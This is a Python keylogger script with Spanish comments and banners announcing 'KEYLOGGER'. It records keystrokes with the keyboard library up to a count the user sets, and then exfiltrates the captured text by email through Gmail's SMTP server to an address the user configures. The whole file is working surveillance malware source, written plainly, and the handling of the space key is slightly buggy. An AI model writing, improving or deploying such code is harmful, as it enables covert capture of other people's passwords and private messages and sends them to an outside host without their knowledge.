


# 0.IMPORTAR LIBRERIAS NECESARIAS

from colorama import Fore, Back, init
import keyboard
import time
import smtplib
from email.mime.text import MIMEText
import time




# 1.TÍTULO Y AUTOR

print(Fore.GREEN)

print(r"""
  _  _________   ___     ___   ____  ____ _____ ____  
 | |/ / ____\ \ / / |   / _ \ / ___|/ ___| ____|  _ \ 
 | ' /|  _|  \ V /| |  | | | | |  _| |  _|  _| | |_) |
 | . \| |___  | | | |__| |_| | |_| | |_| | |___|  _ < 
 |_|\_\_____| |_| |_____\___/ \____|\____|_____|_| \_\

Este programa realiza 3 pasos:
1.Importa las librerias necesarias.
2.Registra las pulsaciones de teclado (el usuario puede configurar cuantas pulsaciones en total quiere registrar).
3.Exfiltra los datos y los envia a un correo electrónico que configura el usuario.

""")

print(r"""
Autor:
  _____             _       _____                             
 |  __ \           | |     / ____|                            
 | |  | | __ _ _ __| | __ | (___   ___  __ _ ___  ___  _ __  
 | |  | |/ _` | '__| |/ /  \___ \ / _ \/ _` / __|/ _ \| '_ \ 
 | |__| | (_| | |  |   <   ____) |  __/ (_| \__ \ (_) | | | |
 |_____/ \__,_|_|  |_|\_\ |_____/ \___|\__,_|___/\___/|_| |_|
                                                              
""")




# 2.REGISTRAR PULSACIONES TECLADO

# Variable contenedor
pulsaciones_registradas = ""

# Contador encargado
contador_pulsaciones = 0

# Solicitar preferencia al usuario
print("")
pulsaciones_maximas = int(input("Introduce la cantidad máxima de pulsaciones que quieres registrar --> "))

#Bucle while para registrar las teclas presionadas, dura mientras no se supere el umbral permitido
while contador_pulsaciones < pulsaciones_maximas:
    # KeyLogger comienza a escuchar todas las teclas del abecedario definidas en la lista
    tecla = keyboard.read_key()
    if tecla in ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "space"]:
        # Es necesario transformar el espacio a su formato correcto
        if tecla == "space":
            tecla = " "
            # Añadir la tecla presionada a la variable contenedor
            pulsaciones_registradas = pulsaciones_registradas + tecla
            print(f"Pulsación {contador_pulsaciones} --> {tecla}")
        pulsaciones_registradas = pulsaciones_registradas + tecla
        # El contador sube por cada ciclo
        contador_pulsaciones = contador_pulsaciones + 1
        print(f"Pulsación {contador_pulsaciones} --> {tecla}")
        # El sleep regula y precisa el procesamiento de teclas registradas para mejorar la eficiencia
        time.sleep(0.15)
print("")
# Imprimir resultado de variables registradas
print("Resultado:")
print(pulsaciones_registradas)




# 3.EXFILTRAR REGISTROS A CORREO ELECTRÓNICO

# Pedir al usuario que introduzca sus datos email
print("")
emisor = input("Introduce tu correo electrónico emisor (Dirección desde la que quieres enviar las pulsaciones registradas)--> ")
receptor = input("Introduce tu correo electrónico receptor (Dirección a la que quieres enviar las pulsaciones registradas) --> ")
contraseña_aplicacion = input("Introduce la contraseña de aplicación de tu correo electrónico emisor (https://myaccount.google.com/apppasswords) --> ")

# Configurar el mensaje para enviar
msg = MIMEText(pulsaciones_registradas)
msg["Subject"] = "Teclas capturadas"
msg["From"] = emisor
msg["To"] = receptor

# Conexión y envío mediante SSL (Puerto 465)
with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
    # Usar credenciales proporcionadas por el usuario
    server.login(emisor, contraseña_aplicacion)
    # Enviar el mensaje
    server.sendmail(emisor, receptor, msg.as_string())

# Nota final
print("")
print("Enviando correo...")
time.sleep(3)
print("")
print("Mensaje enviado correctamente. Revisa tu correo electrónico.")
print("")




